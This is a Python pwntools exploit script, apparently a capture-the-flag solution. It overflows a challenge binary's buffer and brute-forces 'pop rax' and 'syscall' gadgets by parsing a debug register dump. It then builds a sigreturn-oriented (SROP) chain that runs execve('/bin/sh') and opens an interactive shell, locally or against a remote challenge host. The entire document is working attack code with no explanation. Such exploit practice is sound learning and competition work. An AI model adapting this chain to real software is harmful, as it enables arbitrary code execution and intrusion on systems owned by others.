from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 13658, level="error")
    else:
        return process(e.path, level="error")


''' debug mode prints out
  rax | rbx | rcx | rdx | rdi | rsi 
'''


def gadget_finder(s):
    regs = s.split(b'|')
    if b'0x1337' in regs[0]:
        return 'pop rax; ret'
    elif b'0x1337' in regs[1]:
        return 'pop rbx; ret'
    elif b'0x1337' in regs[2]:
        return 'pop rcx; ret'
    elif b'0x1337' in regs[3]:
        return 'pop rdx; ret'
    elif b'0x1337' in regs[4]:
        return 'pop rdi; ret'
    elif b'0x1337' in regs[5]:
        return 'pop rsi; ret'
    else:
        return regs


def find_pop_rax():

    pop_rax = 0x0
    syscall_ret = 0x0
    pop_rbp_ret = 0x0

    ''' loop from first gadget to debug mode '''
    for gadget in range(gadgets_start, debug_mode):
        try:
            p = start()
            pad = cyclic(16)

            ''' chain to display gadgets
       align stack, call gadget, test val, call debug '''

            chain = p64(0x401016)
            chain += p64(gadget)
            chain += p64(0x1337)
            chain += p64(0x401446)

            ''' parse out program output '''
            p.recvuntil(b'Debug Mode Enabled')
            p.recvline()
            p.recvline()
            p.recvline()
            p.recvline()

            ''' send gadget test and receive outpt'''
            p.sendline(pad+chain)
            p.recvline()
            gadget_result = gadget_finder(p.recvline())
            info("Gadget [%s]: %s" % (hex(gadget), gadget_result))
           
            if 'pop rax; ret' in gadget_result:
                pop_rax = gadget

            if 'pop' in gadget_result:
                pop_rbp_ret = 0
            else:
                pop_rbp_ret+=1
            if (pop_rbp_ret==3):
                syscall_ret = gadget - 0x3
        except:

            pass
    return pop_rax, syscall_ret



def srop_exec(pop_rax, bin_sh, syscall_ret):

    chain = p64(pop_rax)
    chain += p64(0xf)
    chain += p64(syscall_ret)

    frame = SigreturnFrame(arch="amd64", kernel="amd64")
    frame.rax = constants.SYS_execve
    frame.rdi = bin_sh
    frame.rip = syscall_ret

    p = start()
    pad = cyclic(16)
    p.recvuntil(b'Debug Mode Enabled; calling ')
    p.recvline()
    p.sendline(pad+chain+bytes(frame))
    p.interactive()

gadgets_start = e.sym['pop_rax']+4
p = start()
p.recvuntil(b'Debug Mode Enabled; calling ')
debug_mode = int(p.recvline(), 16)
p.close()

info("Starting pop rax gadget search between %s to %s" %(hex(gadgets_start),hex(debug_mode)))
pop_rax,syscall_ret = find_pop_rax()

info("[pop rax; ret] discovered at %s" % hex(pop_rax))
info("[syscall; ret] discovered at %s" % hex(syscall_ret))
bin_sh = next(e.search(b'/bin/sh'))
info("[/bin/sh] discovered at %s", hex(bin_sh))
srop_exec(pop_rax ,bin_sh, syscall_ret)


